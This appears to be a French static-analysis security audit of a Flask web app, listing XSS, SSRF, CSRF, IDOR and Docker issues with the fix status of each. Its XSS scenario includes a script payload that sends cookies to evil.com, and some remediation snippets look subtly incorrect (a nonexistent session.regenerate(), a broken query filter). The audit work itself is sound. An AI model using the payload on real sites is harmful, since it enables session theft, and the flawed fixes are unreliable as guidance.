# 🔒 Audit de Sécurité — A.N.A.N.A.S.

**Date:** 2026-05-17  
**Outils analysés:** Flask 3.1.0, SQLAlchemy, Flask-WTF, Flask-Limiter, bleach  

---

## 1. VULNÉRABILITÉS CRITIQUES

### 1.1 XSS par injection via `description` et `verification_notes` (Score: Élevé)
**Fichiers concernés:** `models.py:26`, `templates/item_detail.html:37,249`, `templates/partials/catalogue_item.html:26-27`

Les champs `description`, `verification_notes` des items ne sont **jamais sanitized** avant stockage. S'ils contiennent du HTML/JS, celui-ci est exécuté dans les templates Jinja2.

> **Statut:** ⚠️ Partiellement corrigé — `sanitize_html()` appliqué dans `src/upload_routes.py:82` et `src/interactions.py:91`, mais **toujours manquant dans** `src/admin_routes.py` (route `create_report` ligne 134).

```python
// Scénario d'attaque — un attaquant publie un item avec:
description: "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
verification_notes: "<img src=x onerror=alert(document.domain)>"
```

**Impact:** Vol de sessions, redirections forcées, defacement.

**Remédiation:** Sanitiser les champs au moment du stockage dans `src/upload_routes.py` et `src/admin_routes.py`:
```python
from utils.security import sanitize_html
item.description = sanitize_html(description)
item.verification_notes = sanitize_html(verification_notes) if verification_notes else None
```

---

### 1.2 XSS dans les commentaires — échappement template insuffisant (Score: Élevé)
**Fichiers concernés:** `src/interactions.py:54-55`, `templates/item_detail.html:336,339`

Bien que `sanitize_html()` soit appliqué côté serveur (`interactions.py:54-55`), les templates n'échappent **jamais** les champs `author_name` ni `content`. Un attaquant pourrait contourner le sanitizer via des encodings subtils.

**Remédiation:** Utiliser l'échappement explicite `|e` dans Jinja2:
```html
<span class="comment-author">{{ comment.author_name|e }}</span>
<p class="comment-text">{{ comment.content|e }}</p>
```

> **Statut:** ✅ Correction appliquée — La plupart des champs utilisateurs sont échappés avec `|e` dans les templates principaux. Quelques gaps subsistent (`src="{{ item.image }}"` sans `|e` dans `catalogue_item.html:4`, etc.).

---

### 1.3 Clé secrète Flask chargée depuis fichier local `.secret` (Score: Moyen-Élevé)
**Fichier:** `src/shared.py:92-99`

La clé secrète est lue depuis `.secret` sur le filesystem. Si un attaquant accède à ce fichier, il peut forger des tokens CSRF et des sessions Flask.

**Remédiation:** 
- Forcer la variable d'environnement `FLASK_SECRET_KEY` en production
- Ajouter une vérification de permissions: `os.chmod(SECRET_FILE, 0o600)` lors du démarrage

> **Statut:** ✅ Env var implémenté (`src/shared.py:92`), ⚠️ chmod 600 présent dans `setup.sh` mais pas en Python au runtime.

---

### 1.4 Validation URL — Potentiel SSRF / Open Redirect (Score: Moyen)
**Fichier:** `utils/security.py:14-31`, `src/upload_routes.py:145-148`

La fonction `validate_external_url()` n'accepte que `http`/`https`, mais:
- Les URLs avec `//evil.com` (protocol-relative) peuvent passer
- Aucune validation contre les IPs privées/internal (127.0.0.1, 10.x.x.x, etc.) — risque de SSRF vers des services internes

**Remédiation:** Bloquer protocol-relative et IPs internes:

> **Statut:** ❌ Non corrigé — `validate_external_url()` dans `utils/security.py` ne bloque pas les IPs privées/reserved (pas de module `ipaddress`).

```python
def validate_external_url(url: str) -> bool:
    if not url or not isinstance(url, str):
        return False
    parsed = urlparse(url.strip())
    if parsed.scheme not in ("http", "https"):
        return False
    if "@" in url:
        return False
    hostname = parsed.hostname.lower()
    # Bloquer IPs internes / loopback
    import ipaddress
    try:
        addr = ipaddress.ip_address(hostname)
        if addr.is_private or addr.is_loopback or addr.is_reserved:
            return False
    except ValueError:
        pass  # C'est un nom de domaine, pas une IP brute
    return True
```

---

### 2.1 CSRF bypass trop large pour `/api/*` (Score: Moyen)
**Fichier:** `app.py:68-74`

Toutes les routes `/api/*` sont exemptées du contrôle CSRF automatique. Seules les routes vérifiant explicitement `X-CSRF-Token` dans le `before_request` sont protégées. Si une future route API omet cette vérification, elle sera vulnérable.

**Remédiation:** Lister explicitement les routes exemptées:
```python
EXEMPTED_ENDPOINTS = {'health_check', 'auth.api_something'}
if request.endpoint in EXEMPTED_ENDPOINTS or '/api/' not in req.path:
    _original_protect()  # protéger normalement
else:
    pass  # bypass CSRF explicite uniquement pour les API nécessaires
```

> **Statut:** ❌ Non corrigé — Wildcard `/api/*` toujours en place dans `app.py:69-75`.

---

## 2. VULNÉRABILITÉS DE CONFIGURATION

### 2.2 Rate limiting insuffisant sur l'inscription (Score: Moyen)
**Fichier:** `app.py:122`, `src/auth_routes.py:44`

La connexion a un rate limit de "5 per hour" (`app.py:122`) mais **l'inscription n'en a aucun**. Risques:
- Création massive de comptes (spam)
- Énumération d'emails via side-channel de temps de réponse

**Remédiation:** Ajouter sur `src/auth_routes.py`:
```python
@limiter.limit("3 per hour")
```

> **Statut:** ❌ Non corrigé — Aucun `@limiter.limit()` sur l'endpoint `/inscription` dans `src/auth_routes.py:44`.

### 2.3 Cookies — `SESSION_COOKIE_SECURE` uniquement en production (Score: Moyen)
**Fichier:** `app.py:176`

En développement, les cookies ne sont pas marqués `Secure`, donc transmis en clair via HTTP. Risque en prod si utilisation d'un reverse-proxy sans HTTPS proprement configuré.

> **Statut:** ❌ Non corrigé — `SESSION_COOKIE_SECURE = _is_production_env()` dans `app.py:177`, uniquement activé en production.

### 2.4 CSP — Référence au CDN `https://unpkg.com` (Score: Faible-Moyen)
**Fichier:** `app.py:157`

La CSP inclut `https://unpkg.com` dans `script-src`. Si ce CDN est compromis, un attaquant exécuterait du code arbitraire sur votre site.

**Remédiation:** Héberger les scripts localement ou utiliser des hashes de sous-résistance (SRI) via `<link rel="preconnect">` et integrity hashes.

---

## 3. VULNÉRABILITÉS FONCTIONNELLES

### 3.1 IDOR — Chunks publics sans vérification fine (Score: Moyen)
**Fichier:** `src/item_routes.py:44-70`, `models.py:237`

La route `/catalogue/item/<int:item_id>/data` retourne **tous** les `DataChunk` avec `visibility="public"`. Si un utilisateur marque accidentellement un chunk comme public, il sera exposé à tous.

> **Statut:** ⚠️ Non corrigé — La logique d'accès aux chunks n'a pas été durcie (`src/item_routes.py`).

**Remédiation:**
```python
# Dans src/item_routes.py:53-54
chunks = [c.to_dict() for c in DataChunk.query.filter(
    DataChunk.parent_item_id == item.id,
    (DataChunk.visibility == "public") |
    (getattr(DataChunk, 'owner_user_id', None) == current_user.id if current_user else False)
).all()]
```

---

### 3.2 Pas de rotation de token CSRF après connexion (Score: Faible)
**Fichier:** `app.py:132-134`

Après connexion, le `_csrf_token` est retiré mais la session n'est pas régénérée. Si un attaquant a volé le cookie avant la connexion, il pourrait potentiellement l'utiliser.

**Remédiation:** Régénérer la session après authentification:
```python
from flask import session
session.regenerate()  # ou équivalent selon version de Flask
```

> **Statut:** ⚠️ Partiellement corrigé — `session.clear()` + régénération des valeurs en `app.py:133-137`, mais pas de `session.regenerate()` explicite.

---

### 3.3 Injection via magnet link dans templates (Score: Faible)
**Fichier:** `templates/item_detail.html:230,292-294`, `models.py:75`

Le `magnet_link` est injecté dans des attributs HTML (`data-magnet`). Jinja2 échappe par défaut mais les attributs nécessitent un encoding spécifique.

**Remédiation:** Ajouter `|e` explicitement sur tous les champs injectés:
```html
<a href="{{ item.magnet|e }}" class="btn btn-download">
<button data-magnet="{{ item.magnet|e }}">
```

> **Statut:** ✅ Presque corrigé — La plupart des occurrences de `magnet` utilisent `|e` dans les templates. Vérifier les exceptions restantes.

---

### 3.4 Logs contenant des données utilisateur sensibles (Score: Faible)
**Fichier:** `src/interactions.py:19,29,41`

Des logs `logging.warning()` contiennent `user_id`, `rating_value` qui exposent des informations personnelles en production.

**Remédiation:** Supprimer ou anonymiser ces logs:
```python
import logging
logger = logging.getLogger(__name__)
# Remplacer les warnings par logger.debug() en production
```

> **Statut:** ❌ Non corrigé — `logging.warning()` avec `user_id`, `rating_value` toujours présents dans `src/interactions.py:19,29,41`.

---

### 3.5 Énumération d'emails — Side Channel sur inscription (Score: Faible)
**Fichier:** `src/auth_routes.py:57-58`

Si l'email existe déjà, la redirection vers `/connexion` est silencieuse. Un attaquant peut comparer les temps de réponse pour déterminer si un email est enregistré.

**Remédiation:** Retourner toujours "Un compte a été créé" (si création) ou rediriger avec le même délai artificiel que pour une inscription réussie, indépendamment de l'existence de l'email.

> **Statut:** ❌ Non corrigé — Réponse différentielle toujours présente dans `src/auth_routes.py:57-58`.

---

## 4. VULNÉRABILITÉS DOCKER / INFRASTRUCTURE

### 4.1 Port 5000 exposé sur `0.0.0.0` (Score: Moyen)
**Fichier:** `docker-compose.yml:16`

En production, le port est accessible depuis n'importe quelle IP. Restreindre via un reverse proxy nginx/apache.

> **Statut:** ❌ Non corrigé — Port 5000 exposé sur `0.0.0.0` dans `docker-compose.yml:16`.

### 4.2 Build Docker — Fichiers sensibles inclus dans l'image (Score: Faible)
**Fichier:** `Dockerfile:11`

Le `COPY . .` inclut potentiellement `.env`, `.secret`, `instance/`. Ajouter un `.dockerignore`:
```
.env
.secret
__pycache__
*.pyc
.venv
.git/
.pytest_cache/
sonar-project.properties
instance/
```

> **Statut:** ✅ Corrigé — Fichier `.dockerignore` présent (34 lignes) avec exclusions pour `.env`, `.secret`, `__pycache__`, etc.

### 4.3 Volume Docker persistant pour `.secret` (Score: Faible)
**Fichier:** `docker-compose.yml:21`

Le fichier `.secret` est stocké dans un named volume. En cas de compromission du conteneur, la clé est récupérable via `docker exec`.

---

## 5. SCORE GLOBAL

| Catégorie | Severity | Statut | Détail |
|-----------|----------|--------|--------|
| XSS (Stock) | 🔴 ÉLEVÉ | ⚠️ Partiel | `sanitize_html()` présent dans `upload_routes.py` et `interactions.py`, **manquant dans** `admin_routes.py` |
| XSS (Template) | 🔴 ÉLEVÉ | ✅ Prèsque | Echappement `|e` ajouté pour la plupart des champs, **quelques gaps** (`catalogue_item.html:4`) |
| SSRF / Open Redirect | 🟠 MOYEN | ❌ Non corrigé | Pas de bloquage IPs privées dans `validate_external_url()` |
| CSRF bypass large | 🟠 MOYEN | ❌ Non corrigé | Wildcard `/api/*` toujours en place |
| Rate limiting inscription | 🟠 MOYEN | ❌ Non corrigé | Aucun `@limiter.limit()` sur `/inscription` |
| IDOR chunks | 🟠 MOYEN | ❌ Non corrigé | Logique d'accès aux chunks non durcie |
| Clé secret fichier local | 🟡 MOYEN-FAIBLE | ✅ Env ok / ⚠️ chmod | `FLASK_SECRET_KEY` implémenté, chmod 600 uniquement dans `setup.sh` |
| Rotation session post-login | 🟡 FAIBLE | ⚠️ Partiel | `session.clear()` + régénération en `app.py:133-137`, pas de `session.regenerate()` explicite |
| Magnet link injection | 🟡 FAIBLE | ✅ Presque | `|e` présent sur la plupart des occurrences magnet |
| Logs sensibles | 🟡 FAIBLE | ❌ Non corrigé | `logging.warning()` avec `user_id` toujours présent |
| Email enumeration side-channel | 🟡 FAIBLE | ❌ Non corrigé | Réponse différentielle encore présente |
| Port exposé largement | 🟠 MOYEN | ❌ Non corrigé | 0.0.0.0 sans restriction dans docker-compose |
| Fichiers sensibles en image Docker | 🟡 FAIBLE | ✅ Corrigé | `.dockerignore` présent et complet |

---

## 6. RECOMMANDATIONS PRIORITAIRES

### Priorité 1 — Critique (à corriger immédiatement)
1. ~~**Sanitiser `description` et `verification_notes`** au moment du stockage, pas seulement à l'affichage~~ ✅ Partiel — compléter dans `admin_routes.py`
2. ~~**Ajouter `|e`** dans tous les templates Jinja2 pour les champs utilisateurs (`{{ variable|e }}`)~~ ✅ Presque complet — corriger les gaps restants

### Priorité 2 — Important (à corriger sous 1-2 semaines)
3. ❌ **Protéger `/inscription` POST** avec un rate limiter: `@limiter.limit("3 per hour")`
4. ❌ **Lister explicitement** les routes exemptées CSRF au lieu de `/api/*` wildcard
5. ❌ **Valider les URLs contre les IPs internes** (bloque SSRF vers services Docker/infrastructure)

### Priorité 3 — Recommandé (sous 1 mois)
6. ❌ Supprimer les logs contenant des données utilisateur (`logging.warning()` dans `interactions.py`)
7. ~~**Ajouter un `.dockerignore`** pour exclure `.env`, `.secret`, `__pycache__`~~ ✅ Fait
8. ❌ Restreindre l'exposition du port 5000 via reverse proxy
9. ⚠️ **Forcer les permissions chmod 600** sur le fichier `.secret` — présent dans `setup.sh`, ajouter en Python au runtime

---

## 7. CHECKLIST DE RÉPÉTITION POUR LES FUTURS DÉPLOIEMENTS

- [x] ~~Aucun champ utilisateur n'est stocké sans sanitization~~ ⚠️ Partiel — manquant dans `admin_routes.py`
- [x] ~~Tous les templates échappent les entrées utilisateurs avec `|e`~~ ✅ Presque complet — quelques gaps restants (`catalogue_item.html:4`)
- [ ] Les routes API exemptées de CSRF sont explicitement listées (pas de wildcards) ❌
- [ ] Les URLs soumises par les utilisateurs sont validées contre SSRF ❌
- [ ] Un rate limiter est appliqué sur toutes les routes d'authentification ❌
- [x] ~~Le fichier `.secret` a des permissions 600~~ ✅ `setup.sh` / ⚠️ Python runtime manquant
- [ ] Aucun log ne contient de données utilisateur sensibles ❌
- [x] ~~La session est régénérée après chaque authentification~~ ⚠️ Partiel — `session.clear()` présent, pas `session.regenerate()`

---

*Ce rapport a été généré par analyse statique du code source. Des tests dynamiques (scan de vulnérabilités, pentest manuel) sont recommandés pour une validation complète.*
